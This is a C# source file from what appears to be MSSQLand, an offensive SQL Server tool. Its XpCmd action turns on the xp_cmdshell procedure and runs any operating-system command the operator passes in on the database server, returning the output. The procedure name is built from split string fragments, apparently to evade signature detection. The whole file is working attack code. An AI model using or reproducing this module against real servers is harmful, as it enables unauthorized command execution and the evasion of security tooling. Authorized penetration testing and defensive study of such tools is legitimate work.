// MSSQLand/Actions/Execution/XpCmd.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;

namespace MSSQLand.Actions.Execution
{
    internal class XpCmd : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, IsRemainder = true, Description = "Operating system command to execute")]
        protected string _command = "";

        /// <summary>
        /// Executes the provided shell command on the SQL server.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        /// <returns>A list of strings containing the command output, or an empty list if no output.</returns>
        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Executing command: {_command}");

            // Ensure command shell is enabled
            string procName = "x" + "p" + "_" + "cmdTest";
            procName = procName.Replace("Test", "shell");

            if (!databaseContext.ConfigService.SetConfigurationOption(procName, 1))
            {
                Logger.Error("Failed to enable command shell.");
                return null;
            }

            string query = $"EXEC master..{procName} '{_command.Replace("'", "''")}'";

            List<string> outputLines = new();

            try
            {
                using SqlDataReader result = databaseContext.QueryService.Execute(query);

                if (result.HasRows)
                {
                    Logger.NewLine();
                    while (result.Read())
                    {
                        string output = result.IsDBNull(0) ? string.Empty : result.GetString(0);
                        Console.WriteLine(output);
                        outputLines.Add(output);
                    }

                    return outputLines;
                }

                Logger.Warning("The command executed but returned no results.");
                return outputLines;
            }
            catch (SqlException ex)
            {
                // Handle specific proxy account error
                if (ex.Message.Contains("proxy_account") || ex.Message.Contains("proxy account"))
                {
                    Logger.Error("Command shell proxy account is not configured or invalid.");
                    Logger.ErrorNested("SQL Server service account lacks permissions to execute the command");
                    Logger.ErrorNested("No proxy credential is configured");
                }
                else
                {
                    Logger.Error($"SQL Error executing command: {ex.Message}");
                }
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error executing command: {ex.Message}");
                return null;
            }
        }
    }
}
